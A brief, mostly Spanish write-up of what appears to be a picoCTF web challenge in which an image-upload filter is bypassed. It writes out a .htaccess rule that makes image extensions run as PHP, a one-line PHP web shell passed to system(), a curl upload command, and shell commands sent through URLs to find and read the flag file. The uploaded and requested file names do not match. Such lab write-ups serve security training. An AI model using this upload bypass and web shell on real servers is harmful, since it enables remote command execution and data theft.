## Descripción
A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

Additional details will be available after launching your challenge instance.
## Solución
El reto nos da una pagina para subir imagenes, solo con un formato en especifico, creamos un archivo .htaccess con l contenido:

<FilesMatch "\.(gif|jpe?g|png|svg|php)$"> SetHandler application/x-httpd-php </FilesMatch>

Para poder subir archivos y reconozca php
Después por medio de curl subimos la imagen jpg_con_php.jpg con el contenido:
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>

Y lo subimos por medio de curl:
curl -i -X POST "http://amiable-citadel.picoctf.net:60628/upload.php" \ -F "image=@jpg_con_php.jpg;type=image/jpeg" -m 12

Ahora podemos ejecutar comandos en la url, así que buscamos la ruta de la bandera:
http://amiable-citadel.picoctf.net:49600/images/polyglot.gif?cmd=find%20/%20-maxdepth%203%20-type%20f%20-name%20%22*flag*%22%20-print%202%3E/dev/null

Y nos regresa:
GIF89a��,D;/proc/kpageflags /usr/bin/dpkg-buildflags /var/www/flag.txt

Vemos el archivo:
curl -s "http://amiable-citadel.picoctf.net:49600/images/polyglot.gif?cmd=cat%20%2Fvar%2Fwww%2Fflag.txt"

Y nos regresa la bandera:
GIF89a��,D;picoCTF{s3rv3r_byp4ss_9e7008ba}
## Notas
## Referencias